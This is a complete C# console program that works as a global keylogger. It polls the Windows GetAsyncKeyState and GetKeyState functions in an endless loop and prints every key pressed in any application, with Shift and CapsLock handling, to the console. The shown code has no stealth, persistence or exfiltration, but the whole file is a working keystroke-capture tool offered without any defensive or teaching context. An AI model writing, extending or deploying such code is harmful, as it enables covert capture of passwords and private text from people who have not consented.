using System;
using System.Runtime.InteropServices;

namespace Pudge
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(int i);

        [DllImport("User32.dll")]
        public static extern int GetKeyState(int i);

        static void Main(string[] args)
        {
            while (true)
            {
                System.Threading.Thread.Sleep(150);

                for (int i = 8; i < 223; i++)
                {
                    if (GetAsyncKeyState(i) != 0)
                    {
                        if (GetKeyState(16) == 65408 || GetKeyState(16) == 65409)  
                        {
                            switch (i)
                            {
                                case 48: Console.Write("),\n"); break;
                                case 49: Console.Write("!,\n"); break;
                                case 50: Console.Write("@,\n"); break;
                                case 51: Console.Write("#,\n"); break;
                                case 52: Console.Write("$,\n"); break;
                                case 53: Console.Write("%,\n"); break;
                                case 54: Console.Write("^,\n"); break;
                                case 55: Console.Write("&,\n"); break;
                                case 56: Console.Write("*,\n"); break;
                                case 57: Console.Write("(,\n"); break;
                                case 160: Console.Write("LeftShift,\n"); break;
                                case 161: Console.Write("RightShift,\n");  break;
                                case 162: Console.Write("LeftCtrl,\n"); break;
                                case 163: Console.Write("RightCtrl,\n"); break;
                                case 164: Console.Write("LeftAlt,\n"); break;
                                case 165: Console.Write("RightAlt,\n"); break;
                                case 186: Console.Write(":,\n"); break;
                                case 187: Console.Write("+,\n"); break;
                                case 188: Console.Write("<,\n"); break;
                                case 189: Console.Write("_,\n"); break;
                                case 190: Console.Write(">,\n"); break;
                                case 191: Console.Write("?,\n"); break;
                                case 192: Console.Write("~,\n"); break;
                                case 219: Console.Write("{,\n"); break;
                                case 220: Console.Write("|,\n"); break;
                                case 221: Console.Write("},\n"); break;
                                case 222: Console.Write('"' + ",\n"); break;
                                default:
                                    if ((i >= 'A' && i <= 'Z'))
                                        Console.Write( Console.CapsLock? (char)(i + 32) + ",\n" : (char)i + ",\n");
                                    else
                                    {
                                        ConsoleKey key = (ConsoleKey)i; 
                                        if (!(key.ToString() == "16" || key.ToString() == "17" || key.ToString() == "18"))
                                            Console.WriteLine(key.ToString() + ',');
                                    }
                                    break;
                            }
                        }
                        else
                        {
                            switch (i)
                            {
                                case 20: Console.Write("CapsLock,\n"); break;
                                case 160: Console.Write("LeftShift,\n"); break;
                                case 161: Console.Write("RightShift,\n"); break;
                                case 162: Console.Write("LeftCtrl,\n"); break;
                                case 163: Console.Write("RightCtrl,\n"); break;
                                case 164: Console.Write("LeftAlt,\n"); break;
                                case 165: Console.Write("RightAlt,\n"); break;
                                case 186: Console.Write(";,\n"); break;
                                case 187: Console.Write("=,\n"); break;
                                case 188: Console.Write(",,\n"); break;
                                case 189: Console.Write("-,\n"); break;
                                case 190: Console.Write(".,\n"); break;
                                case 191: Console.Write("/,\n"); break;
                                case 192: Console.Write("`,\n"); break;
                                case 219: Console.Write("[,\n"); break;
                                case 220: Console.Write("\\,\n"); break;
                                case 221: Console.Write("],\n"); break;
                                case 222: Console.Write("',\n"); break;
                                default:
                                    if ((i >= 'A' && i <= 'Z') || (i >= '0' && i <= '9'))
                                        Console.Write((Console.CapsLock || (i >= '0' && i <= '9'))?(char)i + ",\n" : (char)(i + 32) + ",\n");
                                    else
                                    {
                                        ConsoleKey key = (ConsoleKey)i;
                                        if (!(i <= 18 && i >= 16))
                                            Console.WriteLine(key.ToString()+',');
                                    }
                                    break;
                            }
                        }
                    }
                }
            }
        }
    }
}